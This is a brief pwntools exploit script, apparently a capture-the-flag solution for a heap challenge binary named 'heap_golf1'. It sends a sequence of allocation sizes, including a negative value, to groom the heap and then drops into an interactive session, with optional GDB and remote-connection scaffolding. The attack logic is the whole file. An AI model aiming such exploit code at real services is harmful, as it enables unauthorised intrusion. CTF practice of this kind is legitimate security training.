#!/usr/bin/python3
from pwn import *

PATH = "./heap_golf1"
HOST = "0"
PORT = 1234

exe = context.binary = ELF(PATH, checksec=False)
#libc = ELF("libc.so.6") if args.REMOTE  else exe.libc
context.terminal = ['tmux', 'splitw', '-h', '-p', '55']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

gs = '''
set pagination off
set breakpoint pending on

b*0x00000000004008B8

c
'''

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else: 
        return process(exe.path)
def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)

#p = conn()
p = process(exe.path, stdin=PTY, stdout=PTY)
GDB()

sna(b"Size of green to provision: ", 32)
sna(b"Size of green to provision: ", 32)
sna(b"Size of green to provision: ", 32)
sna(b"Size of green to provision: ", 32)
sna(b"Size of green to provision: ", -2)

sna(b"Size of green to provision: ", 32)
sna(b"Size of green to provision: ", 32)
sna(b"Size of green to provision: ", 32)
sna(b"Size of green to provision: ", 32)

p.interactive()
